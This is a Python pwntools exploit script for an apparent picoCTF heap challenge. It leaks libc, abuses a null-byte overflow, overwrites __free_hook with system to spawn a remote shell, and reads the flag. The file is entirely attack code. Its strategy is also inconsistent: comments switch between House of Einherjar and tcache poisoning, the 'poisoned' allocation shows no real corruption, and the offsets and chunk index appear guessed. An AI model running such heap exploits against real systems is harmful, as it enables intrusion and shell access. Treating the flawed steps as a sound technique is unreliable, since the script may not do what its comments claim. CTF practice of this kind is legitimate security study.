#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'debug'
context.arch = 'amd64'

def exploit():
    p = remote(HOST, PORT)
    
    # Navigate initial dialog
    p.recvuntil(b'From Zero to Hero')
    p.sendline(b'y')  # Want to be a hero? Yes
    
    p.recvuntil(b'Really?')
    p.sendline(b'y')  # Really? Yes
    
    # Get the leak - this is __libc_start_main+240
    p.recvuntil(b'Take this: ')
    leak = p.recvline().strip()
    leak_addr = int(leak, 16)
    log.info(f"Leaked __libc_start_main+240: 0x{leak_addr:x}")
    
    # Calculate libc base (for libc 2.29)
    libc_base = leak_addr - 0x21fd0  # __libc_start_main+240 offset
    log.info(f"Libc base: 0x{libc_base:x}")
    
    # Calculate useful addresses
    system = libc_base + 0x4f4e0
    free_hook = libc_base + 0x1e75a8
    
    log.info(f"system: 0x{system:x}")
    log.info(f"__free_hook: 0x{free_hook:x}")
    
    # Now we're at the menu
    p.recvuntil(b'>')
    
    # The vulnerability is an off-by-one null byte overflow in the allocate function
    # It writes a null byte at buffer[size] after reading
    
    # Strategy: Use House of Einherjar technique
    # We need to create chunks and exploit the null byte overflow
    
    # Create first chunk (size 0xf8 to get 0x100 chunk)
    log.info("Creating chunk A (0xf8)")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')  # 0xf8
    p.recvuntil(b'description')
    p.sendline(b'A' * 248)
    p.recvuntil(b'>')
    
    # Create second chunk (prevent consolidation with top)
    log.info("Creating chunk B (0xf8)")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')  # 0xf8
    p.recvuntil(b'description')
    p.sendline(b'B' * 248)
    p.recvuntil(b'>')
    
    # Create guard chunk
    log.info("Creating guard chunk (0x18)")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'24')  # 0x18
    p.recvuntil(b'description')
    p.sendline(b'C' * 24)
    p.recvuntil(b'>')
    
    # Free chunk B (index 1)
    log.info("Freeing chunk B")
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'1')
    p.recvuntil(b'>')
    
    # The null byte overflow in chunk A will overwrite the size field of chunk B
    # This can be exploited for tcache poisoning
    
    # Create a new chunk that will trigger the overflow
    log.info("Creating overflow chunk")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    
    # Craft payload to exploit the null byte overflow
    # The null byte will overwrite the LSB of the next chunk's size
    payload = b'D' * 240
    payload += p64(0x100)  # Fake prev_size
    p.sendline(payload)
    p.recvuntil(b'>')
    
    # Now we have corrupted the heap
    # Let's try to get arbitrary write via tcache poisoning
    
    # Free chunk 0
    log.info("Freeing chunk 0")
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'0')
    p.recvuntil(b'>')
    
    # Allocate again with controlled fd
    log.info("Allocating with poisoned fd")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    p.sendline(p64(free_hook) + b'E' * 240)
    p.recvuntil(b'>')
    
    # Allocate to consume the poisoned chunk
    log.info("Consuming poisoned chunk")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    p.sendline(b'F' * 248)
    p.recvuntil(b'>')
    
    # Next allocation should be at __free_hook
    log.info("Overwriting __free_hook with system")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.sendline(p64(system))
    p.recvuntil(b'>')
    
    # Create a chunk with "/bin/sh"
    log.info("Creating /bin/sh chunk")
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'8')
    p.recvuntil(b'description')
    p.sendline(b'/bin/sh\x00')
    p.recvuntil(b'>')
    
    # Free the "/bin/sh" chunk to trigger system("/bin/sh")
    log.info("Triggering system('/bin/sh')")
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'7')  # Index of the /bin/sh chunk
    
    # We should have shell now
    log.info("Sending command")
    p.sendline(b'cat flag.txt')
    
    # Get the flag
    try:
        flag = p.recvline_contains(b'picoCTF', timeout=2)
        log.success(f"FLAG: {flag.decode()}")
    except:
        log.info("Trying to receive output...")
        try:
            output = p.recvall(timeout=2)
            if b'picoCTF' in output:
                start = output.index(b'picoCTF')
                end = output.index(b'}', start) + 1
                log.success(f"FLAG: {output[start:end].decode()}")
            else:
                log.info(f"Output: {output}")
        except:
            log.info("Going interactive...")
            p.interactive()

if __name__ == "__main__":
    exploit()